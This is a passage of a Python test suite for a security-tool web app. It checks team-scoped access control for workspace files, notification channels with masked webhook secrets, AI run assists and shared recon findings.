            assert [item["path"] for item in list_payload["files"]] == ["shared/notes.txt"]
            assert list_payload["files"][0]["labels"][0]["label"] == "handoff"
            assert list_payload["files"][0]["note"]["body"] == "Shared team context."
            assert operator_read.status_code == 200
            assert operator_read.get_json()["text"] == "team notes\n"
            assert operator_download.status_code == 200
            assert operator_download.data == b"team notes\n"
            assert personal_list.status_code == 200
            assert [item["path"] for item in personal_list.get_json()["files"]] == []
            assert personal_read.status_code in {400, 404}
            assert outsider_list.status_code == 403
            assert outsider_list.get_json()["error"] == "team_forbidden"
            assert moved.status_code == 200
            assert moved_read.status_code == 200
            assert moved_read.get_json()["labels"][0]["label"] == "handoff"
            assert moved_read.get_json()["note"]["body"] == "Shared team context."
            with db_connect() as conn:
                metadata_rows = conn.execute(
                    "SELECT session_id, team_id, entity_type, entity_id FROM entity_labels "
                    "WHERE entity_type = 'workspace_file' AND label = 'handoff'",
                ).fetchall()
                note_rows = conn.execute(
                    "SELECT session_id, team_id, entity_type, entity_id FROM entity_notes "
                    "WHERE entity_type = 'workspace_file' AND body = 'Shared team context.'",
                ).fetchall()
            assert [
                (row["session_id"], row["team_id"], row["entity_id"])
                for row in metadata_rows
            ] == [(operator_token, team_id, "shared/moved.txt")]
            assert [
                (row["session_id"], row["team_id"], row["entity_id"])
                for row in note_rows
            ] == [(operator_token, team_id, "shared/moved.txt")]
            with mock.patch.dict(shell_app.CFG, workspace_cfg, clear=False):
                deleted = client.delete(
                    "/workspace/files?path=shared/moved.txt",
                    headers={"X-Session-ID": operator_token, "X-Team-ID": team_id},
                )
            assert deleted.status_code == 200
        finally:
            for patcher in reversed(patchers):
                patcher.stop()

    def test_team_workspace_viewers_and_archived_teams_are_read_only(self, tmp_path):
        client, patchers = self._team_client(tmp_path)
        workspace_cfg = {"workspace_enabled": True, "workspace_root": str(tmp_path / "workspaces")}
        try:
            owner_token = "tok_team_files_archive_owner"
            viewer_token = "tok_team_files_archive_viewer"
            self._register_session_token(viewer_token)
            created = self._create_team(client, owner_token, name="Readonly Files")
            team_id = created.get_json()["team"]["id"]
            invite = client.post(
                f"/session/teams/{team_id}/invites",
                headers={"X-Session-ID": owner_token},
                json={"role": "viewer", "label": "Files viewer"},
            )
            joined = client.post(
                "/session/teams/join",
                headers={"X-Session-ID": viewer_token},
                json={"code": invite.get_json()["invite"]["code"], "display_name": "Files viewer"},
            )
            assert joined.status_code == 201

            with mock.patch.dict(shell_app.CFG, workspace_cfg, clear=False):
                written = client.post(
                    "/workspace/files",
                    headers={"X-Session-ID": owner_token, "X-Team-ID": team_id},
                    json={"path": "shared/readme.txt", "text": "shared readme\n"},
                )
                viewer_list = client.get(
                    "/workspace/files",
                    headers={"X-Session-ID": viewer_token, "X-Team-ID": team_id},
                )
                viewer_read = client.get(
                    "/workspace/files/read?path=shared/readme.txt",
                    headers={"X-Session-ID": viewer_token, "X-Team-ID": team_id},
                )
                viewer_download = client.get(
                    "/workspace/files/download?path=shared/readme.txt",
                    headers={"X-Session-ID": viewer_token, "X-Team-ID": team_id},
                )
                viewer_write = client.post(
                    "/workspace/files",
                    headers={"X-Session-ID": viewer_token, "X-Team-ID": team_id},
                    json={"path": "blocked.txt", "text": "nope"},
                )
                viewer_mkdir = client.post(
                    "/workspace/directories",
                    headers={"X-Session-ID": viewer_token, "X-Team-ID": team_id},
                    json={"path": "blocked"},
                )
                viewer_move = client.post(
                    "/workspace/files/move",
                    headers={"X-Session-ID": viewer_token, "X-Team-ID": team_id},
                    json={"source": "shared/readme.txt", "destination": "shared/moved.txt"},
                )
                viewer_delete = client.delete(
                    "/workspace/files?path=shared/readme.txt",
                    headers={"X-Session-ID": viewer_token, "X-Team-ID": team_id},
                )
                archived = client.patch(
                    f"/session/teams/{team_id}",
                    headers={"X-Session-ID": owner_token},
                    json={"status": "archived"},
                )
                archived_list = client.get(
                    "/workspace/files",
                    headers={"X-Session-ID": owner_token, "X-Team-ID": team_id},
                )
                archived_read = client.get(
                    "/workspace/files/read?path=shared/readme.txt",
                    headers={"X-Session-ID": owner_token, "X-Team-ID": team_id},
                )
                archived_download = client.get(
                    "/workspace/files/download?path=shared/readme.txt",
                    headers={"X-Session-ID": owner_token, "X-Team-ID": team_id},
                )
                archived_write = client.post(
                    "/workspace/files",
                    headers={"X-Session-ID": owner_token, "X-Team-ID": team_id},
                    json={"path": "archived.txt", "text": "nope"},
                )

            assert written.status_code == 200
            assert viewer_list.status_code == 200
            viewer_payload = viewer_list.get_json()
            assert viewer_payload["owner"]["read_only"] is True
            assert "can't change" in viewer_payload["owner"]["read_only_reason"]
            assert "can't change" in viewer_payload["owner"]["write_denial"]
            assert viewer_read.status_code == 200
            assert viewer_read.get_json()["text"] == "shared readme\n"
            assert viewer_download.status_code == 200
            assert viewer_download.data == b"shared readme\n"
            assert viewer_write.status_code == 403
            assert viewer_mkdir.status_code == 403
            assert viewer_move.status_code == 403
            assert viewer_delete.status_code == 403
            assert archived.status_code == 200
            assert archived_list.status_code == 200
            archived_payload = archived_list.get_json()
            assert archived_payload["owner"]["read_only"] is True
            assert archived_payload["owner"]["team_status"] == "archived"
            assert "Archived teams" in archived_payload["owner"]["read_only_reason"]
            assert "Archived teams" in archived_payload["owner"]["write_denial"]
            assert archived_read.status_code == 200
            assert archived_download.status_code == 200
            assert archived_write.status_code == 409
            assert archived_write.get_json()["error"] == "team_archived"
        finally:
            for patcher in reversed(patchers):
                patcher.stop()

    def test_active_team_scope_shares_notification_channels_and_events(self, monkeypatch, tmp_path):
        from services.notifications import dispatcher
        from services.notifications.models import TRIGGER_RUN_COMPLETE
        from services.notifications.secrets import channel_secret_name, get_channel_secret

        key = base64.b64encode(b"n" * 32).decode("ascii")
        monkeypatch.setenv("SECRETS_MASTER_KEY", key)
        monkeypatch.setattr(secrets_vault, "resolve_data_dir", lambda: str(tmp_path / "secrets"))
        secrets_vault.reset_master_key_cache_for_tests()

        client, patchers = self._team_client(tmp_path)
        try:
            owner_token = "tok_team_notifications_owner"
            admin_token = "tok_team_notifications_admin"
            viewer_token = "tok_team_notifications_viewer"
            self._register_session_token(admin_token)
            self._register_session_token(viewer_token)
            created = self._create_team(client, owner_token, name="Notification Operators")
            team_id = created.get_json()["team"]["id"]
            admin_invite = client.post(
                f"/session/teams/{team_id}/invites",
                headers={"X-Session-ID": owner_token},
                json={"role": "admin", "label": "Notification admin"},
            )
            viewer_invite = client.post(
                f"/session/teams/{team_id}/invites",
                headers={"X-Session-ID": owner_token},
                json={"role": "viewer", "label": "Notification viewer"},
            )
            assert client.post(
                "/session/teams/join",
                headers={"X-Session-ID": admin_token},
                json={"code": admin_invite.get_json()["invite"]["code"], "display_name": "Notification admin"},
            ).status_code == 201
            assert client.post(
                "/session/teams/join",
                headers={"X-Session-ID": viewer_token},
                json={"code": viewer_invite.get_json()["invite"]["code"], "display_name": "Notification viewer"},
            ).status_code == 201

            team_headers = {"X-Session-ID": admin_token, "X-Team-ID": team_id}
            created_channel = client.post(
                "/session/notification-channels",
                headers=team_headers,
                json={
                    "kind": "webhook",
                    "label": "Team webhook",
                    "secret_values": {"url": "https://team.example.invalid/hook"},
                    "triggers": ["run_complete"],
                },
            )
            assert created_channel.status_code == 201
            channel = created_channel.get_json()["channel"]
            secret_name = channel_secret_name(channel["id"], "url")
            assert get_channel_secret(team_id, secret_name) == "https://team.example.invalid/hook"
            assert get_channel_secret(admin_token, secret_name) is None

            viewer_team_channels = client.get(
                "/session/notification-channels",
                headers={"X-Session-ID": viewer_token, "X-Team-ID": team_id},
            )
            admin_personal_channels = client.get(
                "/session/notification-channels",
                headers={"X-Session-ID": admin_token},
            )
            viewer_create = client.post(
                "/session/notification-channels",
                headers={"X-Session-ID": viewer_token, "X-Team-ID": team_id},
                json={"kind": "webhook", "secret_values": {"url": "https://blocked.invalid/hook"}},
            )
            with db_connect() as conn:
                event_ids = dispatcher.enqueue(
                    TRIGGER_RUN_COMPLETE,
                    {"run_id": "run-team-notification"},
                    admin_token,
                    conn=conn,
                    run_id="run-team-notification",
                    team_id=team_id,
                )
                conn.commit()
                channel_row = conn.execute(
                    "SELECT session_token, team_id FROM notification_channels WHERE id = ?",
                    (channel["id"],),
                ).fetchone()
                event_row = conn.execute(
                    "SELECT session_token, team_id FROM notification_events WHERE id = ?",
                    (event_ids[0],),
                ).fetchone()

            viewer_team_events = client.get(
                "/session/notification-events?limit=5",
                headers={"X-Session-ID": viewer_token, "X-Team-ID": team_id},
            )
            admin_personal_events = client.get(
                "/session/notification-events?limit=5",
                headers={"X-Session-ID": admin_token},
            )

            assert viewer_team_channels.status_code == 200
            assert [item["id"] for item in viewer_team_channels.get_json()["channels"]] == [channel["id"]]
            assert admin_personal_channels.status_code == 200
            assert admin_personal_channels.get_json()["channels"] == []
            assert viewer_create.status_code == 403
            assert viewer_create.get_json()["error"] == "team_forbidden"
            assert dict(channel_row) == {"session_token": admin_token, "team_id": team_id}
            assert dict(event_row) == {"session_token": admin_token, "team_id": team_id}
            assert viewer_team_events.status_code == 200
            assert viewer_team_events.get_json()["total"] == 1
            assert viewer_team_events.get_json()["events"][0]["team_id"] == team_id
            assert admin_personal_events.status_code == 200
            assert admin_personal_events.get_json()["total"] == 0
        finally:
            for patcher in reversed(patchers):
                patcher.stop()

    def test_active_team_scope_shares_ai_assists_for_team_runs(self, tmp_path):
        from services.ai import assists as ai_assists

        client, patchers = self._team_client(tmp_path)
        try:
            owner_token = "tok_team_ai_owner"
            operator_token = "tok_team_ai_operator"
            viewer_token = "tok_team_ai_viewer"
            outsider_token = "tok_team_ai_outsider"
            self._register_session_token(operator_token)
            self._register_session_token(viewer_token)
            self._register_session_token(outsider_token)
            created = self._create_team(client, owner_token, name="AI Operators")
            team_id = created.get_json()["team"]["id"]
            operator_invite = client.post(
                f"/session/teams/{team_id}/invites",
                headers={"X-Session-ID": owner_token},
                json={"role": "operator", "label": "AI operator"},
            )
            viewer_invite = client.post(
                f"/session/teams/{team_id}/invites",
                headers={"X-Session-ID": owner_token},
                json={"role": "viewer", "label": "AI viewer"},
            )
            assert operator_invite.status_code == 201
            assert viewer_invite.status_code == 201
            assert client.post(
                "/session/teams/join",
                headers={"X-Session-ID": operator_token},
                json={"code": operator_invite.get_json()["invite"]["code"], "display_name": "AI operator"},
            ).status_code == 201
            assert client.post(
                "/session/teams/join",
                headers={"X-Session-ID": viewer_token},
                json={"code": viewer_invite.get_json()["invite"]["code"], "display_name": "AI viewer"},
            ).status_code == 201

            run_id = "run-team-ai-assist"
            output_rows = [
                {
                    "text": "Starting web scan for darklab.sh with enough detail for a useful assist.",
                    "cls": "",
                    "tsC": "",
                    "tsE": "",
                },
                {
                    "text": "443/tcp open https, 80/tcp open http, and several response headers were detected.",
                    "cls": "",
                    "tsC": "",
                    "tsE": "",
                },
                {
                    "text": "The next useful step is to inspect TLS, redirects, and exposed response metadata.",
                    "cls": "",
                    "tsC": "",
                    "tsE": "",
                },
            ]
            with db_connect() as conn:
                conn.execute(
                    "INSERT INTO runs "
                    "(id, session_id, team_id, run_kind, command, started, finished, exit_code, "
                    "output_preview, output_line_count) "
                    "VALUES (?, ?, ?, 'external', 'nmap -sV darklab.sh', ?, ?, 0, ?, ?)",
                    (
                        run_id,
                        owner_token,
                        team_id,
                        "2026-05-28T19:00:00+00:00",
                        "2026-05-28T19:00:03+00:00",
                        json.dumps(output_rows),
                        len(output_rows),
                    ),
                )
                conn.commit()

            team_headers = {"X-Session-ID": operator_token, "X-Team-ID": team_id}
            owner_team_headers = {"X-Session-ID": owner_token, "X-Team-ID": team_id}
            viewer_team_headers = {"X-Session-ID": viewer_token, "X-Team-ID": team_id}
            ai_cfg_patch = {
                "ai_enabled": True,
                "ai_feature_summary": True,
                "ai_feature_next_commands": True,
                "ai_model": "llama3.1:8b",
                "ai_max_input_chars": 8000,
                "ai_max_queue_depth": 1000,
                "ai_rate_limit_per_session_hour": 20,
                "ai_rate_limit_global_per_minute": 20,
                "share_redaction_enabled": False,
            }
            with mock.patch.dict(config.CFG, ai_cfg_patch), \
                 mock.patch.object(process, "redis_client", process._FakeRedisClient()):
                queued = client.post(f"/runs/{run_id}/ai-summary", json={}, headers=team_headers)
                listed_for_owner = client.get(f"/runs/{run_id}/ai-assists", headers=owner_team_headers)
                listed_for_viewer = client.get(f"/runs/{run_id}/ai-assists", headers=viewer_team_headers)
                viewer_summary = client.post(f"/runs/{run_id}/ai-summary", json={}, headers=viewer_team_headers)
                viewer_next = client.post(f"/runs/{run_id}/ai-next-commands", json={}, headers=viewer_team_headers)
                personal_operator = client.get(f"/runs/{run_id}/ai-assists", headers={"X-Session-ID": operator_token})
                outsider_team = client.get(
                    f"/runs/{run_id}/ai-assists",
                    headers={"X-Session-ID": outsider_token, "X-Team-ID": team_id},
                )

                queued_payload = queued.get_json()
                with db_connect() as conn:
                    assist_row = conn.execute(
                        "SELECT session_id, team_id FROM ai_run_assists WHERE id = ?",
                        (queued_payload["assist"]["id"],),
                    ).fetchone()
                    conn.execute(
                        "UPDATE ai_run_assists SET status = 'completed', payload = ? WHERE id = ?",
                        (json.dumps({"summary": "cached team summary"}), queued_payload["assist"]["id"]),
                    )
                    conn.commit()

                with mock.patch.object(ai_assists.log, "info") as reuse_log:
                    cached_for_owner = client.post(
                        f"/runs/{run_id}/ai-summary",
                        json={},
                        headers=owner_team_headers,
                    )

            assert queued.status_code == 202
            assert queued_payload["assist"]["status"] == "queued"
            assert assist_row["session_id"] == operator_token
            assert assist_row["team_id"] == team_id
            assert listed_for_owner.status_code == 200
            assert [item["id"] for item in listed_for_owner.get_json()["assists"]] == [queued_payload["assist"]["id"]]
            assert listed_for_viewer.status_code == 200
            assert [item["id"] for item in listed_for_viewer.get_json()["assists"]] == [queued_payload["assist"]["id"]]
            for response in (viewer_summary, viewer_next):
                assert response.status_code == 403
                assert response.get_json()["error"] == "team_forbidden"
            assert personal_operator.status_code == 404
            assert personal_operator.get_json()["error"] == "not_found"
            assert outsider_team.status_code == 403
            assert outsider_team.get_json()["error"] == "team_forbidden"
            assert cached_for_owner.status_code == 200
            assert cached_for_owner.get_json()["assist"]["id"] == queued_payload["assist"]["id"]
            reuse_events = [
                call.kwargs["extra"]
                for call in reuse_log.call_args_list
                if call.args and call.args[0] == "AI_ASSIST_ENQUEUE_RESULT"
            ]
            assert reuse_events[0]["inserted"] is False
            assert reuse_events[0]["session"].startswith("tok_team")
        finally:
            for patcher in reversed(patchers):
                patcher.stop()

    def test_active_team_scope_shares_atlas_reads_for_team_runs(self, tmp_path):
        client, patchers = self._team_client(tmp_path)
        try:
            owner_token = "tok_team_atlas_owner"
            operator_token = "tok_team_atlas_operator"
            outsider_token = "tok_team_atlas_outsider"
            self._register_session_token(operator_token)
            self._register_session_token(outsider_token)
            created = self._create_team(client, owner_token, name="Atlas Operators")
            team_id = created.get_json()["team"]["id"]
            invite = client.post(
                f"/session/teams/{team_id}/invites",
                headers={"X-Session-ID": owner_token},
                json={"role": "operator", "label": "Atlas operator"},
            )
            joined = client.post(
                "/session/teams/join",
                headers={"X-Session-ID": operator_token},
                json={"code": invite.get_json()["invite"]["code"], "display_name": "Atlas operator"},
            )
            assert joined.status_code == 201

            personal_run_id = "run-team-atlas-personal"
            team_run_id = "run-team-atlas-shared"
            personal_entity_id = "ent_team_atlas_personal"
            team_entity_id = "ent_team_atlas_shared"
            personal_finding_id = "fnd_team_atlas_personal"
            team_finding_id = "fnd_team_atlas_shared"
            seen_at = "2026-05-28T12:00:00+00:00"
            with db_connect() as conn:
                conn.execute(
                    "INSERT INTO runs "
                    "(id, session_id, team_id, run_kind, command, started, finished, exit_code, "
                    "output_preview, output_line_count, output_search_text) "
                    "VALUES (?, ?, '', 'external', 'httpx personal.example', ?, ?, 0, '[]', 0, '')",
                    (personal_run_id, owner_token, seen_at, seen_at),
                )
                conn.execute(
                    "INSERT INTO runs "
                    "(id, session_id, team_id, run_kind, command, started, finished, exit_code, "
                    "output_preview, output_line_count, output_search_text) "
                    "VALUES (?, ?, ?, 'external', 'httpx shared.example', ?, ?, 0, '[]', 0, '')",
                    (team_run_id, owner_token, team_id, seen_at, seen_at),
                )
                for entity_id, value, run_id in (
                    (personal_entity_id, "personal.example", personal_run_id),
                    (team_entity_id, "shared.example", team_run_id),
                ):
                    conn.execute(
                        "INSERT INTO entities "
                        "(id, session_id, type, canonical_value, signature_hash, first_seen_at, last_seen_at, created) "
                        "VALUES (?, ?, 'domain', ?, ?, ?, ?, ?)",
                        (entity_id, owner_token, value, "sig_" + entity_id, seen_at, seen_at, seen_at),
                    )
                    conn.execute(
                        "INSERT INTO entity_run_links "
                        "(entity_id, run_id, first_seen_at, last_seen_at, occurrence_count) "
                        "VALUES (?, ?, ?, ?, 1)",
                        (entity_id, run_id, seen_at, seen_at),
                    )
                for finding_id, entity_id, run_id, title in (
                    (personal_finding_id, personal_entity_id, personal_run_id, "personal finding"),
                    (team_finding_id, team_entity_id, team_run_id, "shared finding"),
                ):
                    conn.execute(
                        "INSERT INTO findings "
                        "(id, session_id, run_id, entity_id, subject_key, signature_hash, severity, "
                        "kind, tool_root, first_run_id, last_run_id, first_seen_at, last_seen_at, "
                        "occurrence_count, status, title, raw_line, created) "
                        "VALUES (?, ?, ?, ?, ?, ?, 'medium', 'finding', 'httpx', ?, ?, ?, ?, 1, 'new', ?, ?, ?)",
                        (
                            finding_id,
                            owner_token,
                            run_id,
                            entity_id,
                            entity_id,
                            "sig_" + finding_id,
                            run_id,
                            run_id,
                            seen_at,
                            seen_at,
                            title,
                            title,
                            seen_at,
                        ),
                    )
                    conn.execute(
                        "INSERT INTO findings_occurrences (finding_id, run_id, line_number, snippet, seen_at) "
                        "VALUES (?, ?, 1, ?, ?)",
                        (finding_id, run_id, title, seen_at),
                    )
                conn.commit()

            personal_summary = client.get("/atlas", headers={"X-Session-ID": owner_token})
            team_summary = client.get("/atlas", headers={"X-Session-ID": operator_token, "X-Team-ID": team_id})
            team_runs = client.get("/atlas/runs", headers={"X-Session-ID": operator_token, "X-Team-ID": team_id})
            team_entities = client.get(
                "/atlas/entities?type=domain",
                headers={"X-Session-ID": operator_token, "X-Team-ID": team_id},
            )
            team_entity_detail = client.get(
                f"/atlas/entities/{team_entity_id}",
                headers={"X-Session-ID": operator_token, "X-Team-ID": team_id},
            )
            team_findings = client.get("/atlas/findings", headers={"X-Session-ID": operator_token, "X-Team-ID": team_id})
            api_team_entity = client.get(
                f"/api/v1/atlas/entities/{team_entity_id}",
                headers={"X-Session-ID": operator_token, "X-Team-ID": team_id},
            )
            operator_personal_entity = client.get(f"/atlas/entities/{team_entity_id}", headers={"X-Session-ID": operator_token})
            outsider_summary = client.get("/atlas", headers={"X-Session-ID": outsider_token, "X-Team-ID": team_id})

            assert personal_summary.status_code == 200
            assert personal_summary.get_json()["counts"]["domain"] == 1
            assert team_summary.status_code == 200
            assert team_summary.get_json()["counts"]["domain"] == 1
            assert team_summary.get_json()["findings"] == 1
            assert [item["id"] for item in team_runs.get_json()["runs"]] == [team_run_id]
            assert [item["id"] for item in team_entities.get_json()["entities"]] == [team_entity_id]
            assert team_entity_detail.status_code == 200
            assert [item["run_id"] for item in team_entity_detail.get_json()["runs"]] == [team_run_id]
            assert [item["id"] for item in team_findings.get_json()["findings"]] == [team_finding_id]
            assert api_team_entity.status_code == 200
            assert api_team_entity.get_json()["entity"]["id"] == team_entity_id
            assert operator_personal_entity.status_code == 404
            assert outsider_summary.status_code == 403
            assert outsider_summary.get_json()["error"] == "team_forbidden"
        finally:
            for patcher in reversed(patchers):
                patcher.stop()

    def test_active_team_scope_shares_atlas_metadata_and_targets(self, tmp_path):
        client, patchers = self._team_client(tmp_path)
        try:
            owner_token = "tok_team_atlas_metadata_owner"
            operator_token = "tok_team_atlas_metadata_operator"
            self._register_session_token(operator_token)
            created = self._create_team(client, owner_token, name="Atlas Metadata Operators")
            team_id = created.get_json()["team"]["id"]
            invite = client.post(
                f"/session/teams/{team_id}/invites",
                headers={"X-Session-ID": owner_token},
                json={"role": "operator", "label": "Atlas metadata operator"},
            )
            joined = client.post(
                "/session/teams/join",
                headers={"X-Session-ID": operator_token},
                json={"code": invite.get_json()["invite"]["code"], "display_name": "Atlas metadata operator"},
            )
            assert joined.status_code == 201

            run_id = "run-team-atlas-metadata"
            entity_id = "ent_team_atlas_metadata"
            finding_id = "fnd_team_atlas_metadata"
            seen_at = "2026-05-28T12:15:00+00:00"
            with db_connect() as conn:
                conn.execute(
                    "INSERT INTO runs "
                    "(id, session_id, team_id, run_kind, command, started, finished, exit_code, "
                    "output_preview, output_line_count, output_search_text) "
                    "VALUES (?, ?, ?, 'external', 'httpx metadata.example', ?, ?, 0, '[]', 0, '')",
                    (run_id, owner_token, team_id, seen_at, seen_at),
                )
                conn.execute(
                    "INSERT INTO entities "
                    "(id, session_id, type, canonical_value, signature_hash, first_seen_at, last_seen_at, created) "
                    "VALUES (?, ?, 'domain', 'metadata.example', ?, ?, ?, ?)",
                    (entity_id, owner_token, "sig_" + entity_id, seen_at, seen_at, seen_at),
                )
                conn.execute(
                    "INSERT INTO entity_run_links "
                    "(entity_id, run_id, first_seen_at, last_seen_at, occurrence_count) "
                    "VALUES (?, ?, ?, ?, 1)",
                    (entity_id, run_id, seen_at, seen_at),
                )
                conn.execute(
                    "INSERT INTO findings "
                    "(id, session_id, run_id, entity_id, subject_key, signature_hash, severity, kind, tool_root, "
                    "first_run_id, last_run_id, first_seen_at, last_seen_at, occurrence_count, status, title, raw_line, created) "
                    "VALUES (?, ?, ?, ?, ?, ?, 'medium', 'finding', 'httpx', ?, ?, ?, ?, 1, 'new', ?, ?, ?)",
                    (
                        finding_id,
                        owner_token,
                        run_id,
                        entity_id,
                        entity_id,
                        "sig_" + finding_id,
                        run_id,
                        run_id,
                        seen_at,
                        seen_at,
                        "metadata finding",
                        "metadata finding",
                        seen_at,
                    ),
                )
                conn.execute(
                    "INSERT INTO findings_occurrences (finding_id, run_id, line_number, snippet, seen_at) "
                    "VALUES (?, ?, 1, 'metadata finding', ?)",
                    (finding_id, run_id, seen_at),
                )
                conn.commit()

            project_created = client.post(
                "/projects",
                headers={"X-Session-ID": owner_token, "X-Team-ID": team_id},
                json={"name": "Team Atlas Metadata"},
            )
            project_id = project_created.get_json()["project"]["id"]
            operator_headers = {"X-Session-ID": operator_token, "X-Team-ID": team_id}
            owner_headers = {"X-Session-ID": owner_token, "X-Team-ID": team_id}

            label_created = client.post(
                f"/entities/atlas_entity/{entity_id}/labels",
                headers=operator_headers,
                json={"label": "shared-review"},
            )
            note_saved = client.put(
                f"/entities/finding/{finding_id}/note",
                headers=operator_headers,
                json={"body": "review this finding as a team"},
            )
            finding_reviewed = client.put(
                f"/findings/{finding_id}/review",
                headers=operator_headers,
                json={"review_state": "reviewed"},
            )
            intel_refreshed = client.post(
                f"/atlas/entities/{entity_id}/refresh_intel",
                headers=operator_headers,
                json={},
            )
            target_created = client.post(
                f"/projects/{project_id}/targets",
                headers=operator_headers,
                json={"type": "domain", "value": "metadata.example", "source_run_id": run_id},
            )

            owner_labels = client.get(f"/entities/atlas_entity/{entity_id}/labels", headers=owner_headers)
            owner_note = client.get(f"/entities/finding/{finding_id}/note", headers=owner_headers)
            searched_entities = client.get("/atlas/entities?q=shared-review", headers=owner_headers)
            reviewed_findings = client.get("/atlas/findings?review_state=reviewed", headers=owner_headers)
            owner_targets = client.get(f"/projects/{project_id}/targets", headers=owner_headers)
            operator_personal_labels = client.get(
                f"/entities/atlas_entity/{entity_id}/labels",
                headers={"X-Session-ID": operator_token},
            )

            assert label_created.status_code == 201
            assert note_saved.status_code == 200
            assert finding_reviewed.status_code == 200
            assert intel_refreshed.status_code == 200
            assert target_created.status_code == 201
            assert [item["label"] for item in owner_labels.get_json()["labels"]] == ["shared-review"]
            assert owner_note.get_json()["note"]["body"] == "review this finding as a team"
            assert [item["id"] for item in searched_entities.get_json()["entities"]] == [entity_id]
            assert [item["id"] for item in reviewed_findings.get_json()["findings"]] == [finding_id]
            assert [item["canonical_value"] for item in owner_targets.get_json()["targets"]] == ["metadata.example"]
            assert operator_personal_labels.status_code == 404
            with db_connect() as conn:
                metadata_rows = conn.execute(
                    "SELECT session_id, team_id FROM entity_labels WHERE entity_id = ?",
                    (entity_id,),
                ).fetchall()
                finding_status = conn.execute(
                    "SELECT status FROM findings WHERE id = ?",
                    (finding_id,),
                ).fetchone()
            assert {row["session_id"] for row in metadata_rows} == {operator_token}
            assert {row["team_id"] for row in metadata_rows} == {team_id}
            assert finding_status["status"] == "reviewed"
        finally:
            for patcher in reversed(patchers):
                patcher.stop()


class TestNotificationChannelRoutes:
    def _notification_client(self, monkeypatch, tmp_path):
        key = base64.b64encode(b"c" * 32).decode("ascii")
        monkeypatch.setenv("SECRETS_MASTER_KEY", key)
        monkeypatch.setattr(secrets_vault, "resolve_data_dir", lambda: str(tmp_path))
        secrets_vault.reset_master_key_cache_for_tests()
        db_path = str(tmp_path / "notification-routes.db")
        lock_path = str(tmp_path / "notification-routes.lock")
        patchers = [
            mock.patch("core.database.DB_PATH", db_path),
            mock.patch("core.database.DB_INIT_LOCK_PATH", lock_path),
        ]
        for patcher in patchers:
            patcher.start()
        db_init()
        client = get_client()
        return client, patchers

    def _create_webhook_channel(self, client, session_id):
        self._register_session_token(session_id)
        return client.post(
            "/session/notification-channels",
            headers={"X-Session-ID": session_id},
            json={
                "kind": "webhook",
                "label": "Ops webhook",
                "secret_values": {"url": "https://example.invalid/hook"},
                "triggers": ["run_complete"],
            },
        )

    def _register_session_token(self, session_id):
        with db_connect() as conn:
            conn.execute(
                "INSERT OR IGNORE INTO session_tokens (token, created, last_seen_at) VALUES (?, ?, ?)",
                (session_id, datetime.now(timezone.utc).isoformat(), ""),
            )
            conn.commit()

    def test_notification_channels_require_durable_session_tokens(self, monkeypatch, tmp_path):
        client, patchers = self._notification_client(monkeypatch, tmp_path)
        try:
            resp = client.get("/session/notification-channels", headers={"X-Session-ID": "sess-anonymous"})
            kind_contract = client.get("/session/notification-channel-kinds", headers={"X-Session-ID": "sess-anonymous"})
            assert resp.status_code == 401
            assert resp.get_json()["error"] == "session_token_required"
            assert kind_contract.status_code == 401
            assert kind_contract.get_json()["error"] == "session_token_required"
        finally:
            for patcher in reversed(patchers):
                patcher.stop()

    def test_notification_channel_crud_masks_secret_values(self, monkeypatch, tmp_path):
        from services.notifications.secrets import channel_secret_name, get_channel_secret

        client, patchers = self._notification_client(monkeypatch, tmp_path)
        try:
            session_id = "tok_notification_routes"
            created = self._create_webhook_channel(client, session_id)
            assert created.status_code == 201
            assert "https://example.invalid/hook" not in created.get_data(as_text=True)
            payload = created.get_json()["channel"]
            assert payload["kind"] == "webhook"
            assert payload["label"] == "Ops webhook"
            assert payload["triggers"] == ["run_complete"]
            assert payload["secret_fields"] == [{"name": "url", "configured": True}]
            secret_name = channel_secret_name(payload["id"], "url")
            assert get_channel_secret(session_id, secret_name) == "https://example.invalid/hook"

            listed = client.get("/session/notification-channels", headers={"X-Session-ID": session_id})
            assert listed.status_code == 200
            assert "https://example.invalid/hook" not in listed.get_data(as_text=True)
            assert listed.get_json()["channels"][0]["id"] == payload["id"]
            kind_contract = client.get("/session/notification-channel-kinds", headers={"X-Session-ID": session_id})
            webhook_kind = next(item for item in kind_contract.get_json()["kinds"] if item["kind"] == "webhook")
            assert webhook_kind["secret_fields"] == [{"name": "url", "label": "Webhook URL"}]

            kind_change = client.patch(
                f"/session/notification-channels/{payload['id']}",
                headers={"X-Session-ID": session_id},
                json={
                    "kind": "telegram",
                    "label": "Wrong type",
                    "config": {"chat_id": "-100123"},
                    "secret_values": {"bot_token": "secret-token"},
                    "triggers": ["watcher_error"],
                },
            )
            assert kind_change.status_code == 400
            assert kind_change.get_json()["error"] == "kind_locked"
            assert get_channel_secret(session_id, secret_name) == "https://example.invalid/hook"

            updated = client.patch(
                f"/session/notification-channels/{payload['id']}",
                headers={"X-Session-ID": session_id},
                json={
                    "kind": "webhook",
                    "label": "Muted webhook",
                    "config": {"timeout_seconds": "5"},
                    "triggers": ["watcher_error"],
                    "muted": True,
                },
            )
            assert updated.status_code == 200
            updated_payload = updated.get_json()["channel"]
            assert updated_payload["label"] == "Muted webhook"
            assert updated_payload["config"] == {"timeout_seconds": "5"}
            assert updated_payload["triggers"] == ["watcher_error"]
            assert updated_payload["muted"] is True
            assert updated_payload["secret_fields"] == [{"name": "url", "configured": True}]
            assert get_channel_secret(session_id, secret_name) == "https://example.invalid/hook"

            secret_replaced = client.patch(
                f"/session/notification-channels/{payload['id']}",
                headers={"X-Session-ID": session_id},
                json={
                    "kind": "webhook",
                    "label": "Replacement webhook",
                    "config": {"timeout_seconds": "6"},
                    "secret_values": {"url": "https://replacement.example.invalid/hook"},
                    "triggers": ["run_complete"],
                    "muted": False,
                },
            )
            assert secret_replaced.status_code == 200
            assert get_channel_secret(session_id, secret_name) == "https://replacement.example.invalid/hook"
            assert "https://replacement.example.invalid/hook" not in secret_replaced.get_data(as_text=True)
            audit_rows = _audit_event_rows(
                target_id=payload["id"],
                event_type="notification.config_change",
            )
            assert [row["details"]["action"] for row in audit_rows] == ["create", "update", "update"]
            assert {row["target_type"] for row in audit_rows} == {"notification"}
            assert {row["details"]["source"] for row in audit_rows} == {"browser"}
            assert audit_rows[0]["details"]["kind"] == "webhook"
            assert audit_rows[1]["details"]["changed_fields"] == ["label", "config", "triggers", "muted"]
            assert audit_rows[2]["details"]["changed_fields"] == ["label", "config", "triggers", "muted"]
            audit_json = json.dumps(audit_rows)
            assert "https://example.invalid/hook" not in audit_json
            assert "https://replacement.example.invalid/hook" not in audit_json
        finally:
            for patcher in reversed(patchers):
                patcher.stop()

